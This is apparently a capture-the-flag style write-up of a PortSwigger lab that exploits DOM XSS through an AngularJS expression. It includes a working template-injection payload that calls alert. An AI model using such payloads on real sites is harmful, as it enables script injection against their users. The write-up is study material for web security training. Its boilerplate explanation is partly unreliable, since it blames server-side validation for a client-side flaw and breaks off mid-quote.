# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal:

Exploit the DOM XSS vulnerability to call the alert function.

### Analysis/Exploit:

**Let’s try to inject some JavaScript code:**

`<script>alert(document.domain)</script>`

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/a71a87eb6161_001.png)

**View source page:**

`<section class=blog-header>
    <h1>0 search results for '&lt;script&gt;alert(document.domain)&lt;/script&gt;'</h1>
    <hr>
</section>`

As you can see, the `<>` is HTML encoded.

**However, since AngularJS is being used, we can execute JavaScript expressions within double curly braces**

```javascript

{{$on.constructor('alert(1)')()}}
```

### Why It Works

The exploit succeeds because this lab contains a dom-based cross-site scripting vulnerability in a angularjs expression within the search functionality.

The official solution confirms: Enter a random alphanumeric string into the search box. View the page source and observe that your random string is enclosed in an ng-app directive.

The root cause is a failure in the application's security architecture specific to this cross site scripting scenario — the server does not properly validate or secure the user-controlled input that reaches the vulnerable operation.

### Key Takeaways

- This lab contains DOM-based cross-site scripting vulnerability, demonstrating how cross site scripting vulnerabilities manifest in real applications.
- The vulnerability is exploitable because user input reaches a sensitive operation without adequate server-side validation.
- PortSwigger confirms: "This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within th"
- Context-aware output encoding is the primary defense — the correct encoding depends on where input is reflected.

## PortSwigger Lab

**Official lab:** DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**PortSwigger:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
